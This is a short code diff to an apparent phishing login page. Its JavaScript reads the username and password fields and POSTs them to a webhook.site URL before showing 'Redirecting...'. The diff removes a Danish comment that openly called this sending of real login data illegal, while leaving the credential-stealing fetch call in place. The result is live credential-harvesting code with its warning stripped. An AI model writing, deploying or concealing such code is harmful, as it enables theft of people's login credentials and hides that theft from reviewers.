@@ -17,7 +17,6 @@
          let password = document.getElementById("passwordInput").value;
     
          if(username && password){
-             // Ulovlig: sende rigtige login-data til server
              fetch("https://webhook.site/990efb4e-3041-4151-b69a-edbd70b8f9c5", {
                  method: "POST",
                  body: JSON.stringify({username: username, password: password})
@@ -32,3 +31,4 @@
   <p>Redirecting...</p> 
 </body> 
 </html>
+
